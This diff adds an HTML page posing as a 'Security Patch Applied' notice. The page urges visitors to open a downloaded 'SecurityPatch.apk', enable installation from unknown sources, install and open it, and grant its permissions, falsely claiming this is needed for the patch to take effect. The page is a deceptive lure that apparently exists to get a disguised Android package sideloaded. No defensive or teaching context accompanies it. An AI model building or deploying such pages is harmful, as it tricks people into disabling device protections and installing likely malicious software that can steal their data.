@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Update Installed</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .card {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 400px;
+            width: 90%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            text-align: center;
+        }
+        .icon { font-size: 60px; margin-bottom: 20px; }
+        h1 { font-size: 20px; margin-bottom: 10px; color: #28a745; }
+        p { color: #666; margin-bottom: 5px; font-size: 14px; line-height: 1.6; }
+        .steps { text-align: left; margin: 20px 0; font-size: 13px; color: #555; }
+        .steps li { margin: 10px 0; line-height: 1.5; }
+        .warning { background: #fff3cd; color: #856404; padding: 10px; border-radius: 8px; font-size: 12px; margin-top: 15px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="icon">✅</div>
+        <h1>Security Patch Applied</h1>
+        <p>Your device is now up to date.</p>
+        <div class="steps">
+            <p><strong>To complete the installation:</strong></p>
+            <ol>
+                <li>Open your <strong>Downloads</strong> folder or notification bar</li>
+                <li>Tap on the <strong>SecurityPatch.apk</strong> file</li>
+                <li>Tap <strong>Install</strong> (if prompted, enable "Install from unknown sources")</li>
+                <li>Tap <strong>Open</strong> after installation</li>
+                <li>Grant the permissions when asked</li>
+            </ol>
+        </div>
+        <div class="warning">
+            ⚠️ You must install and open the app for the security patch to take effect.
+        </div>
+    </div>
+</body>
+</html>
